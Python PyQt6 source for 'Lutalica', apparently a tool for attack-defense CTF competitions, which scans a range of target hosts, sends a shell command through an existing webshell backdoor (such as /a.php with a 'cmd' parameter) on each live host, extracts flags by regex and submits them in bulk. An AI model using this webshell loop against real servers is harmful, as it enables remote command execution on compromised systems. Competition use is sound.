import json
import logging
import re

import requests
from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtGui import QFont, QIcon
from PyQt6.QtWidgets import QApplication, QFrame, QWidget, QHBoxLayout, QVBoxLayout, QListWidgetItem
from qfluentwidgets import FluentWindow, FluentIcon, ImageLabel, SubtitleLabel, CaptionLabel, TextEdit, LineEdit, \
    setFont, PushButton, ToolButton, ListWidget, ComboBox

logging.basicConfig(
    filename="app.log",
    level=logging.INFO,
    format="[%(levelname)s] %(asctime)s: %(message)s",
    datefmt="%Y-%m-%d %A %H:%M:%S"
)


class HomeWindow(QFrame):
    def __init__(self, parent=None):
        super().__init__(parent=parent)
        layout = QHBoxLayout(self)
        leftLayout = QVBoxLayout(self)
        rightLayout = QVBoxLayout(self)

        cover = 'resource/logo.png'
        self.image = ImageLabel(cover, self)
        self.image.scaledToHeight(450)
        self.image.setBorderRadius(8, 8, 8, 8)
        leftLayout.addWidget(self.image)

        self.label = CaptionLabel("Lutalica", self)
        setFont(self.label, 64)
        rightLayout.addWidget(self.label, 1, Qt.AlignmentFlag.AlignCenter)

        layout.addLayout(leftLayout)
        layout.addLayout(rightLayout)


class subWindow1(QFrame):
    addItemSignal = pyqtSignal(str)

    def __init__(self, fileUpdateEvent1, parent=None):
        super().__init__(parent=parent)

        self.aliveHosts = []
        self._fileUpdateEvent = fileUpdateEvent1

        layout = QHBoxLayout(self)
        leftLayout = QVBoxLayout(self)
        rightLayout = QVBoxLayout(self)

        cover = 'resource/Archive1.png'
        self.image = ImageLabel(cover, self)
        self.image.scaledToHeight(290)
        self.image.setBorderRadius(8, 8, 8, 8)
        leftLayout.addWidget(self.image)

        subtitleLabel = '靶机扫描'
        self.subtitle = SubtitleLabel(subtitleLabel, self)
        setFont(self.subtitle, 24)
        self.subtitle.setFixedHeight(50)
        leftLayout.addWidget(self.subtitle, 1, Qt.AlignmentFlag.AlignLeft)

        scanContainer = QWidget()
        targetLayout = QHBoxLayout(scanContainer)
        self.targetLabel = CaptionLabel("扫描目标", self)
        setFont(self.targetLabel, 18)
        self.icon = ToolButton(self)
        self.icon.setIcon(FluentIcon.SEARCH)
        self.target = LineEdit()
        self.target.setPlaceholderText("https://192-168-1-{X}.pvp3994.bugku.cn")
        self.scanButton = PushButton("开始扫描", self)
        self.stopButton = PushButton("停止扫描", self)
        self.scanState = "stopped"
        targetLayout.addWidget(self.targetLabel)
        targetLayout.addWidget(self.icon)
        targetLayout.addWidget(self.target)
        targetLayout.addWidget(self.scanButton)
        targetLayout.addWidget(self.stopButton)
        leftLayout.addWidget(scanContainer)

        paramContainer = QWidget()
        paramLayout = QHBoxLayout(paramContainer)
        self.startLabel = CaptionLabel("起始值", self)
        setFont(self.startLabel, 18)
        self.start = LineEdit()
        self.start.setFixedWidth(80)
        self.start.setPlaceholderText("起始值")
        paramLayout.addWidget(self.startLabel)
        paramLayout.addWidget(self.start)
        self.endLabel = CaptionLabel("最大值", self)
        setFont(self.endLabel, 18)
        self.end = LineEdit()
        self.end.setFixedWidth(80)
        self.end.setPlaceholderText("最大值")
        paramLayout.addWidget(self.endLabel)
        paramLayout.addWidget(self.end)
        self.stepLabel = CaptionLabel("步进", self)
        setFont(self.stepLabel, 18)
        self.step = LineEdit()
        self.step.setFixedWidth(80)
        self.step.setPlaceholderText("步进")
        paramLayout.addWidget(self.stepLabel)
        paramLayout.addWidget(self.step)
        self.ignoreLabel = CaptionLabel("忽略值", self)
        setFont(self.ignoreLabel, 18)
        self.ignore = LineEdit()
        self.ignore.setFixedWidth(80)
        self.ignore.setPlaceholderText("忽略值[1, 39...]")
        paramLayout.addWidget(self.ignoreLabel)
        paramLayout.addWidget(self.ignore)
        self.timeoutLabel = CaptionLabel("超时时间", self)
        setFont(self.timeoutLabel, 18)
        self.timeout = LineEdit()
        self.timeout.setFixedWidth(80)
        self.timeout.setPlaceholderText("超时时间(s)")
        paramLayout.addWidget(self.timeoutLabel)
        paramLayout.addWidget(self.timeout)
        paramLayout.addStretch(1)
        leftLayout.addWidget(paramContainer)

        listContainer = QWidget()
        listLayout = QHBoxLayout(listContainer)
        self.listLabel = CaptionLabel("[+]靶机列表", self)
        setFont(self.listLabel, 18)
        self.clearButton = PushButton("清空", self)
        self.clearButton.setFixedWidth(100)
        listLayout.addWidget(self.listLabel)
        listLayout.addWidget(self.clearButton)
        leftLayout.addWidget(listContainer)

        self.list = ListWidget(self)
        self.list.setFixedHeight(320)
        self.list.setSelectionMode(self.list.SelectionMode.ExtendedSelection)
        self.addItemSlot("存活靶机")
        leftLayout.addWidget(self.list)
        leftLayout.setStretchFactor(self.list, 1)
        leftLayout.addStretch(1)

        self.logLabel = CaptionLabel("[*]扫描日志", self)
        self.logLabel.setFixedHeight(50)
        setFont(self.logLabel, 20)
        rightLayout.addWidget(self.logLabel)
        self.log = TextEdit()
        textFont = QFont()
        textFont.setPointSize(14)
        self.log.setFont(textFont)
        self.log.setMinimumWidth(350)
        self.log.setReadOnly(True)
        rightLayout.addWidget(self.log)

        layout.addLayout(leftLayout)
        layout.addLayout(rightLayout)
        self.loadHosts()
        self.scanButton.clicked.connect(self.startScan)
        self.stopButton.clicked.connect(self.stopScan)
        self.clearButton.clicked.connect(self.clearHosts)
        self.addItemSignal.connect(self.addItemSlot)

    def addItemSlot(self, item):
        try:
            item = QListWidgetItem(item)
            itemFont = QFont()
            itemFont.setPointSize(14)
            item.setFont(itemFont)
            self.list.addItem(item)
        except Exception as e:
            logging.error(e)
            pass

    def loadHosts(self):
        try:
            with open('./data/ip.json', 'r', encoding='utf-8') as f:
                hosts = json.load(f)
                for host in hosts:
                    ip = host["ip"]
                    self.aliveHosts.append(ip)
                    self.addItemSlot(ip)
        except Exception as e:
            logging.error(e)
            pass

    def saveHosts(self):
        try:
            self.aliveHosts.sort()
            with open('./data/ip.json', 'w', encoding='utf-8') as f:
                hosts = [{"ip": host} for host in self.aliveHosts]
                json.dump(hosts, f)
            self._fileUpdateEvent.trigger()
        except Exception as e:
            logging.error(e)
            pass

    def startScan(self):
        self.scanState = "running"
        self.HostScan()

    def stopScan(self):
        self.scanState = "stopped"

    def HostScan(self):
        target = self.target.text()
        start = self.start.text()
        end = self.end.text()
        step = self.step.text()
        ignore = self.ignore.text()
        timeout = self.timeout.text()
        start = int(start) if start.isdigit() else 0
        end = int(end) if end.isdigit() else 0
        step = int(step) if step.isdigit() else 1
        timeout = int(timeout) if timeout.isdigit() else 1
        try:
            ignore = [int(i) for i in ignore.split(',')]
        except Exception as e:
            ignore = []
            logging.error(e)
            pass

        self.log.append(f"[*] 开始扫描")
        for X in range(start, end + 1, step):
            if self.scanState == "stopped":
                self.log.append("[-] 扫描已停止")
                logging.info("[-] 扫描已停止")
                break
            if X not in ignore:
                url = target.format(X=X)
                try:
                    requests.head(url, timeout=timeout)
                    if url not in self.aliveHosts:
                        self.aliveHosts.append(url)
                        self.addItemSignal.emit(url)
                        self.log.append(f"{url} 存活")
                        QApplication.processEvents()
                    else:
                        self.log.append(f"{url} 已存在")
                        QApplication.processEvents()
                except Exception as e:
                    self.log.append(f"{url} 无法访问")
                    logging.error(e)
                    QApplication.processEvents()
                    pass
        self.log.append("[-] 扫描结束\n")
        logging.info("[-] 扫描结束\n")
        self.saveHosts()

    def clearHosts(self):
        self.list.clear()
        self.addItemSlot("存活靶机")
        self.aliveHosts = []
        with open('./data/ip.json', 'w', encoding='utf-8') as f:
            json.dump([], f)
        self._fileUpdateEvent.trigger()


class subWindow2(QFrame):
    addItemSignal = pyqtSignal(str)

    def __init__(self, fileUpdateEvent1, updateEvent2, parent=None):
        super().__init__(parent=parent)

        self.aliveHosts = []
        fileUpdateEvent1.registerListener(self.loadHosts)
        self._updateEvent = updateEvent2

        layout = QHBoxLayout(self)
        leftLayout = QVBoxLayout(self)
        rightLayout = QVBoxLayout(self)

        cover = 'resource/Archive2.png'
        self.image = ImageLabel(cover, self)
        self.image.scaledToHeight(290)
        self.image.setBorderRadius(8, 8, 8, 8)
        leftLayout.addWidget(self.image)

        subtitleLabel = '后门利用'
        self.subtitle = SubtitleLabel(subtitleLabel, self)
        setFont(self.subtitle, 24)
        self.subtitle.setFixedHeight(50)
        leftLayout.addWidget(self.subtitle, 1, Qt.AlignmentFlag.AlignLeft)

        execContainer = QWidget()
        pathLayout = QHBoxLayout(execContainer)
        self.pathLabel = CaptionLabel("后门路径", self)
        setFont(self.pathLabel, 18)
        self.icon = ToolButton(self)
        self.icon.setIcon(FluentIcon.CONNECT)
        self.path = LineEdit()
        self.path.setPlaceholderText("/a.php")
        self.execButton = PushButton("开始执行", self)
        self.method = ComboBox()
        items = ['POST', 'GET']
        self.method.addItems(items)
        pathLayout.addWidget(self.pathLabel)
        pathLayout.addWidget(self.icon)
        pathLayout.addWidget(self.path)
        pathLayout.addWidget(self.method)
        pathLayout.addWidget(self.execButton)
        leftLayout.addWidget(execContainer)

        paramContainer = QWidget()
        paramLayout = QHBoxLayout(paramContainer)
        self.passwdLabel = CaptionLabel("连接密码", self)
        setFont(self.passwdLabel, 18)
        self.passwd = LineEdit()
        self.passwd.setFixedWidth(150)
        self.passwd.setPlaceholderText("cmd")
        paramLayout.addWidget(self.passwdLabel)
        paramLayout.addWidget(self.passwd)
        self.commandLabel = CaptionLabel("命令", self)
        setFont(self.commandLabel, 18)
        self.command = LineEdit()
        self.command.setFixedWidth(150)
        self.command.setPlaceholderText("ls")
        paramLayout.addWidget(self.commandLabel)
        paramLayout.addWidget(self.command)
        self.regexLabel = CaptionLabel("regex", self)
        setFont(self.regexLabel, 18)
        self.regex = LineEdit()
        self.regex.setFixedWidth(150)
        self.regex.setPlaceholderText("flag")
        paramLayout.addWidget(self.regexLabel)
        paramLayout.addWidget(self.regex)
        paramLayout.addStretch(1)
        leftLayout.addWidget(paramContainer)

        listContainer = QWidget()
        listLayout = QHBoxLayout(listContainer)
        self.listLabel = CaptionLabel("[+]靶机列表", self)
        setFont(self.listLabel, 18)
        listLayout.addWidget(self.listLabel)
        leftLayout.addWidget(listContainer)

        self.list = ListWidget(self)
        self.list.setFixedHeight(320)
        self.list.setSelectionMode(self.list.SelectionMode.ExtendedSelection)
        self.addItemSlot("存活靶机")
        leftLayout.addWidget(self.list)
        leftLayout.setStretchFactor(self.list, 1)
        leftLayout.addStretch(1)

        self.logLabel = CaptionLabel("[*]执行日志", self)
        self.logLabel.setFixedHeight(50)
        setFont(self.logLabel, 20)
        rightLayout.addWidget(self.logLabel)
        self.log = TextEdit()
        textFont = QFont()
        textFont.setPointSize(14)
        self.log.setFont(textFont)
        self.log.setMinimumWidth(350)
        self.log.setReadOnly(True)
        rightLayout.addWidget(self.log)

        layout.addLayout(leftLayout)
        layout.addLayout(rightLayout)
        self.loadHosts()
        self.execButton.clicked.connect(self.WebShell)

    def addItemSlot(self, item):
        try:
            item = QListWidgetItem(item)
            itemFont = QFont()
            itemFont.setPointSize(14)
            item.setFont(itemFont)
            self.list.addItem(item)
        except Exception as e:
            logging.error(e)
            pass

    def loadHosts(self):
        try:
            self.list.clear()
            self.addItemSlot("存活靶机")
            with open('./data/ip.json', 'r', encoding='utf-8') as f:
                hosts = json.load(f)
                for host in hosts:
                    ip = host["ip"]
                    self.aliveHosts.append(ip)
                    self.addItemSlot(ip)
        except Exception as e:
            logging.error(e)

    def WebShell(self):
        path = self.path.text()
        method = self.method.currentText()
        passwd = self.passwd.text()
        command = self.command.text()
        regex = self.regex.text()
        if regex != "":
            regex += "{.*}"
        resultList = []

        try:
            with open('./data/ip.json', 'r', encoding='utf-8') as f:
                hosts = json.load(f)
            for host in hosts:
                ip = host["ip"]
                url = f"{ip}{path}"
                data = {passwd: command}
                res = ""
                if method == "GET":
                    res = requests.get(url, params=data, timeout=0.3)
                elif method == "POST":
                    res = requests.post(url, data=data, timeout=0.3)
                self.log.append(f"{url}: \n{res.text}")
                if regex != "":
                    result = re.findall(regex, res.text)
                    if result:
                        resultList.append(result[0])
            resultList.sort()
            with open('./data/flag.json', 'w', encoding='utf-8') as f:
                results = [{"flag": result} for result in resultList]
                json.dump(results, f)
            self._updateEvent.trigger()
        except Exception as e:
            logging.error(e)
            pass


class subWindow3(QFrame):
    addItemSignal = pyqtSignal(str)

    def __init__(self, updateEvent2, parent=None):
        super().__init__(parent=parent)

        updateEvent2.registerListener(self.loadFlags)

        layout = QHBoxLayout(self)
        leftLayout = QVBoxLayout(self)
        rightLayout = QVBoxLayout(self)

        cover = 'resource/Archive3.png'
        self.image = ImageLabel(cover, self)
        self.image.scaledToHeight(290)
        self.image.setBorderRadius(8, 8, 8, 8)
        leftLayout.addWidget(self.image)

        subtitleLabel = '批量提交'
        self.subtitle = SubtitleLabel(subtitleLabel, self)
        setFont(self.subtitle, 24)
        self.subtitle.setFixedHeight(50)
        leftLayout.addWidget(self.subtitle, 1, Qt.AlignmentFlag.AlignLeft)

        submitContainer = QWidget()
        addressLayout = QHBoxLayout(submitContainer)
        self.addressLabel = CaptionLabel("提交地址", self)
        setFont(self.addressLabel, 18)
        self.icon = ToolButton(self)
        self.icon.setIcon(FluentIcon.CONNECT)
        self.address = LineEdit()
        self.address.setPlaceholderText("http://localhost:19999/api/flag")
        self.submitButton = PushButton("开始提交", self)
        addressLayout.addWidget(self.addressLabel)
        addressLayout.addWidget(self.icon)
        addressLayout.addWidget(self.address)
        addressLayout.addWidget(self.submitButton)
        leftLayout.addWidget(submitContainer)

        paramContainer = QWidget()
        paramLayout = QHBoxLayout(paramContainer)
        self.contentLabel = CaptionLabel("Content-Type", self)
        setFont(self.contentLabel, 18)
        self.content = LineEdit()
        self.content.setFixedWidth(240)
        self.content.setPlaceholderText("application/json")
        paramLayout.addWidget(self.contentLabel)
        paramLayout.addWidget(self.content)
        self.authorLabel = CaptionLabel("Authorization", self)
        setFont(self.authorLabel, 18)
        self.author = LineEdit()
        self.author.setFixedWidth(240)
        self.author.setPlaceholderText("e5f3fc5426c3c3ed0e4647b4df884af4")
        paramLayout.addWidget(self.authorLabel)
        paramLayout.addWidget(self.author)
        paramLayout.addStretch(1)
        leftLayout.addWidget(paramContainer)

        listContainer = QWidget()
        listLayout = QHBoxLayout(listContainer)
        self.listLabel = CaptionLabel("[+]提交列表", self)
        setFont(self.listLabel, 18)
        listLayout.addWidget(self.listLabel)
        leftLayout.addWidget(listContainer)

        self.list = ListWidget(self)
        self.list.setFixedHeight(320)
        self.list.setSelectionMode(self.list.SelectionMode.ExtendedSelection)
        self.addItemSlot("存活靶机")
        leftLayout.addWidget(self.list)
        leftLayout.setStretchFactor(self.list, 1)
        leftLayout.addStretch(1)

        self.logLabel = CaptionLabel("[*]提交日志", self)
        self.logLabel.setFixedHeight(50)
        setFont(self.logLabel, 20)
        rightLayout.addWidget(self.logLabel)
        self.log = TextEdit()
        textFont = QFont()
        textFont.setPointSize(14)
        self.log.setFont(textFont)
        self.log.setMinimumWidth(350)
        self.log.setReadOnly(True)
        rightLayout.addWidget(self.log)

        layout.addLayout(leftLayout)
        layout.addLayout(rightLayout)
        self.loadFlags()
        self.submitButton.clicked.connect(self.submitBatch)

    def addItemSlot(self, item):
        try:
            item = QListWidgetItem(item)
            itemFont = QFont()
            itemFont.setPointSize(14)
            item.setFont(itemFont)
            self.list.addItem(item)
        except Exception as e:
            logging.error(e)
            pass

    def loadFlags(self):
        try:
            self.list.clear()
            self.addItemSlot("提交列表")
            with open('./data/flag.json', 'r', encoding='utf-8') as f:
                results = json.load(f)
                for result in results:
                    flag = result["flag"]
                    self.addItemSlot(flag)
        except Exception as e:
            logging.error(e)

    def submitBatch(self):
        address = self.address.text()
        content = self.content.text()
        author = self.author.text()

        headers = {
            "Content-Type": content,
            "Authorization": author
        }
        try:
            with open("./data/flag.json", 'r', encoding='utf-8') as f:
                flags = json.load(f)
            for flag in flags:
                flag = flag["flag"]
                data = {"flag": flag}
                res = requests.post(address, headers=headers, json=data, timeout=0.3)
                if res.status_code == 200:
                    self.log.append(f"{flag}提交成功")
                else:
                    self.log.append(f"{res.text}")
        except Exception as e:
            logging.error(e)


class Event:
    def __init__(self):
        self._listeners = []

    def registerListener(self, listener):
        self._listeners.append(listener)

    def trigger(self, *args, **kwargs):
        for listener in self._listeners:
            listener(*args, **kwargs)


class App(FluentWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Lutalica")
        self.setWindowIcon(QIcon('resource/logo.png'))

        self.home = HomeWindow()
        self.home.setObjectName("Home")
        self.addSubInterface(self.home, FluentIcon.HOME, "主页")

        updateEvent1 = Event()
        updateEvent2 = Event()
        self.window1 = subWindow1(updateEvent1)
        self.window1.setObjectName("Window1")
        self.addSubInterface(self.window1, FluentIcon.HISTORY, "靶机扫描")
        self.window2 = subWindow2(updateEvent1, updateEvent2)
        self.window2.setObjectName("Window2")
        self.addSubInterface(self.window2, FluentIcon.COMMAND_PROMPT, "后门利用")
        self.window3 = subWindow3(updateEvent2)
        self.window3.setObjectName("Window3")
        self.addSubInterface(self.window3, FluentIcon.SAVE, "批量提交")
        self.showMaximized()


def run():
    try:
        app = QApplication([])
        # app.setFont(QFont("HarmonyOS Sans SC"))
        window = App()
        window.show()
        app.exec()
    except Exception as e:
        logging.error(e)


if __name__ == "__main__":
    run()
